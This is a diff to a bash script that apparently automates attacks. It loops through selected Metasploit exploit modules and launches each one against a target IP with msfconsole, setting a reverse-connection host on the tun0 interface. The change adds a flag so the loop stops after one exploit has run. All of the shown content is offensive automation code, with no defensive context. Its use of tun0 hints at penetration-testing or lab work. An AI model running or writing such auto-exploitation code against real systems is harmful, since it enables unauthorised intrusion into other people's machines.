@@ -155,7 +155,9 @@ while read vuln; do
             read -ra exploits <<< "$chosenExploits"
 
             # Loop through the exploits and attempt to use them
-            for exploit in "${exploits[@]}"; do
+           for exploit in "${exploits[@]}"; do
+            if [ "$exploit_executed" = false ]
+            then
                 echo "Using exploit $exploit"
                 msfconsole -x "use $exploit; set LHOST tun0; set RHOSTS $IP; run" &
                 sleep 10 # Wait for the exploit to execute
@@ -168,8 +170,8 @@ while read vuln; do
                 else
                     echo "Failed to exploit vulnerability $vuln using exploit $exploit"
                 fi
-            done
-
+            fi
+        done
             if [ "$exploitsFound" -eq 0 ]
             then
                 echo "Failed to exploit vulnerability $vuln using any of the available exploits"
